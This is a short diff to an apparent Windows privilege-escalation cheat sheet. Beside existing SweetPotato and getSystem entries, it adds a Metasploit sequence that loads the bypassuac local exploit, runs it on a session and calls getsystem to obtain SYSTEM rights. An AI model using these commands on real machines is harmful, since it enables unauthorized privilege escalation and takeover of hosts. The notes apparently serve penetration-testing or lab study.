@@ -42,3 +42,16 @@ https://github.com/CCob/SweetPotato
 SweetPotato -a "whoami"
 ## getSystem
 getSystem "whoami"
+
+
+### bypassuac
+
+```bash
+search bypassuac
+use exploit/windows/local/bypassuac
+options
+set session 1
+run -j
+getuid
+getsystem
+```
